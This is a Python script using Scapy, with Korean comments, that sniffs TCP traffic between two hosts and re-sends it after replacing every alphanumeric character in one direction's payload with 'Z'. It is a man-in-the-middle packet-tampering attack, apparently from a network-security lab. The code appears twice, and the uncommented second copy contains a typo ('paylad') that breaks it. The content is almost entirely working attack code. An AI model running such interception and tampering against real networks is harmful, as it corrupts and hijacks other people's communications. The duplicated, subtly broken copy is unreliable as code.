from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP

# IP 주소와 MAC 주소 정의
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"

# 패킷을 변조하는 함수
def spoof_pkt(pkt):
    # 만약 패킷의 출발지 IP가 IP_A이고 목적지 IP가 IP_B인 경우:
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # 패킷의 IP 헤더를 복사하여 새로운 패킷 생성
        newpkt = IP(bytes(pkt[IP]))
        # IP chksum field 삭제
        del(newpkt.chksum)
        # TCP payload field, chksum field 삭제
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # 만약 패킷에 TCP 페이로드가 있는 경우:
        if pkt[TCP].payload:
            # TCP 페이로드 데이터를 가져오고, 숫자와 문자를 'Z'로 대체
            data = pkt[TCP].payload.load
            newdata = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())
            # 변조된 데이터를 포함하는 새로운 패킷 전송
            send(newpkt/newdata)
        else:
            # TCP 페이로드가 없는 경우, 변조 없이 새로운 패킷 전송
            send(newpkt)
    # 만약 패킷의 출발지 IP가 IP_B이고 목적지 IP가 IP_A인 경우:
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # 패킷의 IP 헤더를 복사하여 새로운 패킷 생성
        newpkt = IP(bytes(pkt[IP]))
        # IP chksum field 삭제
        del(newpkt.chksum)
        # TCP chksum field 삭제
        del(newpkt[TCP].chksum)
        # newpkt 전송
        send(newpkt)

# 템플릿 정의
template = 'tcp and (ether src {A} or ether src {B})'
# 위에 정의한 템플릿에 MAC 주소를 삽입하여 최종 필터 문자열 생성
f = template.format(A=MAC_A, B=MAC_B)
# 'eth0' 네트워크 인터페이스에서 패킷을 수신하고, 필터링 및 변조를 수행하는 함수를 콜백으로 지정하여 패킷 수신
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].paylad)
        del(newpkt[TCP].chksum)
        
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())
            send(newpkt/newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)
        
template = 'tcp and (ether src {A} or ether src {B})'
f = template.format(A=MAC_A, B=MAC_B)
pkt = sniff(iface='eth0', filter = f, prn=spoof_pkt)